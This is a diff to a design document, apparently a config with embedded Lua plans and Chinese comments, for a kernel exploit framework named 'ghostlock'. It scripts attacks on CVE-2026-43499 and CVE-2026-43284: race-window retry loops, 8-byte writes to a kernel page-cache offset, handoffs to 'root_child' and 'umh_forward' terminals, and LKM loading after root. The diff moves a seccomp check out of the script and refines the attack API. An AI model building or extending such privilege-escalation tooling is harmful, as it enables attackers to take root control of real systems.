@@ -29,14 +29,11 @@ ghostlock {
         -- 自由循环/条件（值来自数据面，不写死）
         local r = cfg.backend.cve_2026_43499.execution.race
         for i = 1, r.w3_attempts do
-          if gl.sym("seccomp_mode") ~= 0 then
-            b:settle{ us = r.setup_settle_us }
-          else
-            break
-          end
+          -- 运行期校验由 backend **内部**完成（脚本不可见；`gl.*` 预置函数已废）
+          b:settle{ us = r.setup_settle_us }
         end
 
-        b:handoff{ terminal = "root_child" }        -- 交接给 terminal 相位
+        b:handoff{ terminal = "root_child", payload_ref = "root_child.handoff" }   -- 引用语义
         -- 收尾脚本与 LKM 由 Kotlin 在 resolve 后准备并作为输入传入；磁盘 HOCON 不定义具体 handoff
       ]==]
     },
@@ -45,10 +42,10 @@ ghostlock {
       plan = [==[
         local p = backend("cve_2026_43284")
         p:writeop{ target = { kind = "kernel_offset", value = cfg.offsets.pagecache_slot }, value = 1, width = 8 }
-        p:handoff{ terminal = "umh_forward" }
+        p:handoff{ terminal = "umh_forward", payload_ref = "umh.handoff" }
 
         -- 中途换路（方案 2：clean 句柄 + 重新 acquire）——route 只在 acquire 给，无「切换」动词
-        close(p)                                        -- 释放旧句柄（generation 递增，旧句柄失效）
+        p:close()                                       -- **句柄方法**：释放（generation 递增，旧句柄失效）
         local p2 = backend("cve_2026_43284", { route = "select_stack" })
         p2:writeop{ target = { kind = "kernel_offset", value = cfg.offsets.pagecache_slot }, value = 1, width = 8 }
         -- 收尾同上：由 Kotlin 在 resolve 后作为输入传入；本档不定义命令内容
@@ -98,9 +95,10 @@ ghostlock {
 | b:writeop{ target = {kind,value}, value, width } | W1/W2/W3 与 43284 的写入 | **窗口相位** |
 | b:settle{ us } | W3 重试循环内 | **窗口相位** |
 | b:handoff{ terminal, payload_ref } | 交接（**引用语义**：只声明 terminal + payload 引用） | 窗口外 |
+| **`b:close()`**（句柄方法） | 释放句柄（换路 = close + 重新 acquire） | 窗口外 |
 | cfg.backend... / cfg.lkm.path | 各处取数 | stage 期只读快照 |
-| ~~run{ argv = {...} }~~（**待裁定移除**） | 收尾（若保留） | **terminal 相位（root 后）** |
-| gl.sym("seccomp_mode") | 条件判断 | stage 期（预置工具函数） |
+| ~~run{ argv = {...} }~~（**已移除**：收尾属 document ③ 段） | — | — |
+| ~~gl.sym(...)~~（**已废**：预置函数不属暴露面；运行期校验在 backend 内部） | — | — |
 
 ## §5 待确认两处（影响本示例的最终写法）
 
